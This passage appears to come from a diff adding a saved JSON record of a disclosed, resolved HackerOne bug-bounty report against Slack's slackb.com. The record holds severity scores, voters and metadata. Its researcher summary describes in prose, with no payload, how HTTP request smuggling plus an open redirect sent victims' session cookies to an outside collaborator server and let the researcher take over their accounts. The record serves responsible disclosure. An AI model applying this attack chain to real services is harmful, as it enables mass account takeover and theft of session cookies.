b%2FeXH9HnXDImPFjR1Dh6%2Bs5l3iUZFktJ9K5VkjaNMEOJYqJtm4yrS3ZZrTwbTUiIh559Vs5HegNil2%2BxvdGItHWxYO1aG8tNeSoI6lMhNY7zeK0nPYloxk9Xf7htUDoh5QxZYMdMwMICF%2FQQ%2F1Mvh3EwXNJuwtrgGF1fkXpXES9vDJQmcwgDzOzgBOwsUIDIsdXsfmo7pG2Kagls8uBdXwELGxQ%2BAwYqgsx%2FfyjnTWZP0gSL8a3uhavIPJTyNotnMRMMGXt9IGOrABA60ddC8t9Hc9w0j0HWn%2FIBCY5x5mrXQllMtjmHKPiWe4kT11GetMBOZODMEpWkFoHvfoxjksWQbYFmtXs6HczffjUyvzb5wm4H6rqeqRrkGbdi9NDODc%2FLVjY6DzOGdzJFxvTfRvBPO7aUo436qZlyy%2BACMhU5U3Qulyld%2BR%2FRN7U8h7SoxAWmvfAIur%2BNQTa2RJoSy%2BbzB4arAvZZfHNbbzbUTv%2Fp29121Byyk6dsQ%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=05fdef7d268ba4ae10d33ba28a413c2d03be0672cbeb8332310943ea48ffc2ad",
+      "file_size": 103373,
+      "type": "image/png",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": "2020-04-11T00:02:11.909Z",
+  "allow_singular_disclosure_after": -196924214.80645722,
+  "singular_disclosure_allowed": true,
+  "vote_count": 866,
+  "voters": [
+    "omarelfarsaoui",
+    "jayeshjodhawat",
+    "sebd",
+    "ikuamike",
+    "0xmohamed",
+    "aboalezz",
+    "panya",
+    "jeti",
+    "orange303",
+    "spac3man",
+    "and 856 more..."
+  ],
+  "severity": {
+    "rating": "critical",
+    "score": 9.3,
+    "author_type": "User",
+    "metrics": {
+      "attack_vector": "network",
+      "attack_complexity": "low",
+      "privileges_required": "none",
+      "user_interaction": "none",
+      "scope": "changed",
+      "confidentiality": "high",
+      "integrity": "low",
+      "availability": "none"
+    }
+  },
+  "structured_scope": {
+    "databaseId": 22249,
+    "asset_type": "URL",
+    "asset_identifier": "slackb.com",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "id": 20200,
+      "category": "researcher",
+      "content": "This researcher exploited an HTTP Request Smuggling bug on a Slack asset to perform a CL.TE-based hijack onto neighboring customer requests. This hijack forced the victim into an open-redirect that forwarded the victim onto the researcher's collaborator client with slack domain cookies. The posted cookies in the customer request on the collaborator client contained the customer's secret session cookie. With this attack the researcher was able to prove session takeover against arbitrary slack customers.",
+      "updated_at": "2020-02-13T16:39:17.080Z",
+      "can_view?": true,
+      "can_create?": false,
+      "attachments": [],
+      "user": {
+        "id": 100825,
+        "username": "defparam",
+        "name": "defparam",
+        "bio": "Security Researcher",
+        "cleared": true,
+        "verified": true,
+        "website": null,
+        "location": "Massachusetts",
+        "created_at": "2016-08-12T15:36:50.545Z",
+        "url": "https://hackerone.com/defparam",
+        "hackerone_triager": false,
+        "hackerone_employee": false,
+        "user_type": "hacker",
+        "profile_picture_urls": {
+          "small": "https://profile-photos.hackerone-user-content.com/variants/i50w29os1otgiy5sdiwmaujw4sam/b8e19a7691128fca51630d7f5b14644b91b3b45324f6fd488e36244d744fe35b",
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/i50w29os1otgiy5sdiwmaujw4sam/89f037b490baf3dcca1b84283f4c85141b64c213252a9c79b56c62bf903ab542",
+          "xtralarge": "https://profile-photos.hackerone-user-content.com/variants/i50w29os1otgiy5sdiwmaujw4sam/f0e07660005686ec92c43da54c0094c1ac1b490ea8c5eac04a4081d912d6ce36"
+        }
+      }
+    }
+  ],
+  "databaseId": "737140",
+  "votes": 866,
+  "latest_disclosable_activity_at": "2020-03-12T00:29:01.471Z",
+  "_metadata": {
+    "saved_at": "2026-07-08T13:12:26.854763",
+    "source": "https://hackerone.com/reports/737140.json",
+    "report_id": 737140
+  },
+  "_graphql_detail": {
+    "id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC83MzcxNDA=",
+    "databaseId": "737140",
+    "title": "Mass account takeovers using HTTP Request Smuggling on https://slackb.com/ to steal session cookies",
+    "url": "https://hackerone.com/reports/737140",
+    "state": null,
+    "substate": "resolved",
+    "disclosed_at": "2020-03-12T00:29:01.426Z",
+    "created_at": "2019-11-14T00:07:59.113Z",
+    "submitted_at": null,
+    "weakness": {
+      "id": "Z2lkOi8vaGFja2Vyb25lL1dlYWtuZXNzLzg2",
+      "name": "HTTP Request Smuggling",
+      "external_id": "cwe-444"
+    },
+    "severity": {
+      "rating": "critical",
+      "score": 9.3
+    },
+    "reporter": {
+      "username": "defparam"
+    },
+    "team": {
+      "id": "Z2lkOi8vaGFja2Vyb25lL0VuZ2FnZW1lbnRzOjpCdWdCb3VudHlQcm9ncmFtLzY5",
+      "handle": "slack",
+      "name": "Slack",
+      "url": "https://hackerone.com/slack",
+      "currency": "usd"
+    },
+    "bounties": {
+      "edges": [
+        {
+          "node": {
+            "id": "Z2lkOi8vaGFja2Vyb25lL0JvdW50eS8xNzIzNTM=",
+            "amount": "0.00",
+            "awarded_amount": "0.00",
+            "awarded_bonus_amount": "0.00",
+            "created_at": "2019-11-14T23:13:13.941Z"
+          }
+        }
+      ]
+    }
+  },
+  "_hacktivity": {
+    "__typename": "HacktivityDocument",
+    "id": "Z2lkOi8vaGFja2Vyb25lL0NvbXBsZXRlSGFja3Rpdml0eVJlcG9ydEluZGV4LzczNzE0MA==",
+    "_id": "737140",
+    "disclosed": true,
+    "votes": 866,
+    "latest_disclosable_activity_at": "2020-03-12T00:29:01.471Z",
+    "report": {
+      "id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC83MzcxNDA=",
+      "databaseId": "737140",
+      "title": "Mass account takeovers using HTTP Request Smuggling on https://slackb.com/ to steal session cookies",
+      "url": "https://hackerone.com/reports/737140",
+      "disclosed_at": "2020-03-12T00:29:01.426Z"
+    },
+    "team": {
+      "id": "Z2lkOi8vaGFja2Vyb25lL0VuZ2FnZW1lbnRzOjpCdWdCb3VudHlQcm9ncmFtLzY5",
+      "handle": "slack",
+      "name": "Slack",
+      "url": "https://hackerone.com/slack",
+      "currency": "usd"
+    }
+  }
+}
